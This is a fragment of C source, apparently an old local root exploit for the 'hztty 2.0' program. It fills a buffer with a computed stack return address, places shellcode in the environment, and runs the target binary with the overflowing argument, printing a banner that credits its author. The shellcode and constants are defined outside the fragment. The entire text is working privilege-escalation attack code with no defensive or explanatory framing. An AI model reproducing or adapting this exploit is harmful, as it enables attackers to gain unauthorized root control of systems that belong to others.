int main()
{
	int i;
	char out[SIZE];
	char *own[] = { shellcode, 0x0 };

	int *hztty = (int *)(out);
	int ret = 0xbffffffa - strlen(BIN) - strlen(shellcode);

	for (i=0 ; i<SIZE-1 ; i+=4)
		*hztty++ = ret;

	hztty = 0x0;

	fprintf (stdout, "\n ---  local root exploit for hztty 2.0  ---\n");
	fprintf (stdout, " ---  coded by c0wboy ~ www.0x333.org   ---\n\n");

	execle (BIN, BIN, "-I", out, 0x0, own, 0x0);
}